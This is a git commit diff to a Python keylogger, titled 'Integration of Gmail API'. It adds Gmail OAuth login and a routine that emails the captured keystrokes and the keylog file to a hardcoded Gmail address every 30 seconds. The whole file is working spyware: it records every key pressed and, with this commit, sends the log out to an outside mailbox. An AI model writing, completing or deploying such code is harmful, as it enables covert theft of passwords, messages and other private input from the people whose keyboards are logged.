46af7c0fe7807a48bd143ed8469bdb4cf3154397
Amad Siddiqui <80278397+Amad-Ahmed@users.noreply.github.com>
2023-02-05 18:36:48 +0500

    Integration of Gmail API

--- main.py
+++ main.py
@@ -1,10 +1,102 @@
 # Importing the required libraries
-import keyboard # for keylogs
+import keyboard  # for keylogs
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+import os
+import pickle
+# Gmail API utils
+from googleapiclient.discovery import build
+from google_auth_oauthlib.flow import InstalledAppFlow
+from google.auth.transport.requests import Request
+# for encoding/decoding messages in base64
+from base64 import urlsafe_b64decode, urlsafe_b64encode
+# for dealing with attachement MIME types
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
+from email.mime.audio import MIMEAudio
+from email.mime.base import MIMEBase
+from mimetypes import guess_type as guess_mime_type
 
-SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
+# Request all access (permission to read/send/receive emails, manage the inbox, and more)
+SCOPES = ['https://mail.google.com/']
+our_email = 'amadsiddiqui619@gmail.com'
+SEND_REPORT_EVERY = 30  # in seconds, 60 means 1 minute and so on
+
+
+def gmail_authenticate():
+    creds = None
+    # the file token.pickle stores the user's access and refresh tokens, and is
+    # created automatically when the authorization flow completes for the first time
+    if os.path.exists("token.pickle"):
+        with open("token.pickle", "rb") as token:
+            creds = pickle.load(token)
+    # if there are no (valid) credentials availablle, let the user log in.
+    if not creds or not creds.valid:
+        if creds and creds.expired and creds.refresh_token:
+            creds.refresh(Request())
+        else:
+            flow = InstalledAppFlow.from_client_secrets_file(
+                'credentials.json', SCOPES)
+            creds = flow.run_local_server(port=0)
+        # save the credentials for the next run
+        with open("token.pickle", "wb") as token:
+            pickle.dump(creds, token)
+    return build('gmail', 'v1', credentials=creds)
+
+# Adds the attachment with the given filename to the given message
+
+
+def add_attachment(message, filename):
+    content_type, encoding = guess_mime_type(filename)
+    if content_type is None or encoding is not None:
+        content_type = 'application/octet-stream'
+    main_type, sub_type = content_type.split('/', 1)
+    if main_type == 'text':
+        fp = open(filename, 'rb')
+        msg = MIMEText(fp.read().decode(), _subtype=sub_type)
+        fp.close()
+    elif main_type == 'image':
+        fp = open(filename, 'rb')
+        msg = MIMEImage(fp.read(), _subtype=sub_type)
+        fp.close()
+    elif main_type == 'audio':
+        fp = open(filename, 'rb')
+        msg = MIMEAudio(fp.read(), _subtype=sub_type)
+        fp.close()
+    else:
+        fp = open(filename, 'rb')
+        msg = MIMEBase(main_type, sub_type)
+        msg.set_payload(fp.read())
+        fp.close()
+    filename = os.path.basename(filename)
+    msg.add_header('Content-Disposition', 'attachment', filename=filename)
+    message.attach(msg)
+
+
+def build_message(destination, obj, body, attachments=[]):
+    if not attachments:  # no attachments given
+        message = MIMEText(body)
+        message['to'] = destination
+        message['from'] = our_email
+        message['subject'] = obj
+    else:
+        message = MIMEMultipart()
+        message['to'] = destination
+        message['from'] = our_email
+        message['subject'] = obj
+        message.attach(MIMEText(body))
+        for filename in attachments:
+            add_attachment(message, filename)
+    return {'raw': urlsafe_b64encode(message.as_bytes()).decode()}
+
+
+def send_message(service, destination, obj, body, attachments=[]):
+    return service.users().messages().send(
+        userId="me",
+        body=build_message(destination, obj, body, attachments)
+    ).execute()
 
 
 class Keylogger:
@@ -12,12 +104,13 @@ class Keylogger:
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
-        # this is the string variable that contains the log of all 
+        # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes both are same because logger would run for a day
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+
     def callback(self, event):
         """
         This callback is invoked whenever a keyboard event is occured
@@ -41,12 +134,13 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         # finally, add the key name to our global `self.log` variable
         self.log += name
-    
+
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
         # File name generated for that instance of file which will be currently written into
         # File recreated according to duration set for variable SEND_REPORT_EVERY
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        start_dt_str = str(self.start_dt)[
+            :-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
@@ -58,7 +152,7 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
-    
+
     def report(self):
         """
         This function gets called every `self.interval`
@@ -71,17 +165,21 @@ class Keylogger:
             self.update_filename()
             if self.report_method == "file":
                 self.report_to_file()
+
+            # test send email
+            send_message(service, "amadsiddiqui619@gmail.com", "This is a subject",
+                         self.log, [f"{self.filename}.txt"])
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
-       
+
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
         timer.daemon = True
         # start the timer
         timer.start()
-    
+
     def start(self):
         # record the start datetime
         self.start_dt = datetime.now()
@@ -93,8 +191,11 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
-    
+
 
 if __name__ == "__main__":
+    # get the Gmail API service
+    service = gmail_authenticate()
+
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
